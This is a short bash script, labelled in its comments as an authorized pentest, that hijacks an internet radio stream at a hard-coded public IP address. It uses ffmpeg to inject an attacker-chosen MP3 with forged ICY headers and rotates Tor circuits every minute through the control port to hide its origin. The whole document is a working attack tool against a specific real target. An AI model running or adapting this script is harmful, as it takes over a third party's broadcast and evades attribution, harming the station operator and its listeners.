#!/bin/bash
# fm_hijack_tor_minimal.sh - One-Shot Tor-Rotating ICY Hijack (Authorized Pentest)
# ./fm_hijack_tor_minimal.sh http://your-stream.mp3

TARGET="185.33.21.170:10000"
URL="$1"
[ -z "$URL" ] && { echo "Usage: $0 https://www.myinstants.com/media/sounds/peppe-brescia-poeta.mp3"; exit 1; }

torsocks bash -c "
  # Circuit 1 - Test
  torify curl -s 'http://$TARGET/' | head -5
  
  # Rotate + Hijack
  echo 'AUTHENTICATE \"\"\nSIGNAL NEWNYM\nQUIT' | nc 127.0.0.1 9051 2>/dev/null
  sleep 3
  
  ffmpeg -y -v quiet -stream_loop -1 -re -i '$URL' -c:a libmp3lame -b:a 192k \
    -f mp3 -headers 'ICY 1.0
icy-name:HIJACK_$(date +%s)
icy-description:AUTHORIZED_PENTEST
icy-url:pentest.local
icy-br:192
' tcp://$TARGET &
  
  # Auto-rotate 10x (60s each)
  for i in {1..10}; do
    sleep 60
    echo 'AUTHENTICATE \"\"\nSIGNAL NEWNYM\nQUIT' | nc 127.0.0.1 9051 2>/dev/null
    sleep 3
    torify curl -s 'http://$TARGET/' | grep -i hijack || echo 'Reconnect...'
  done
"
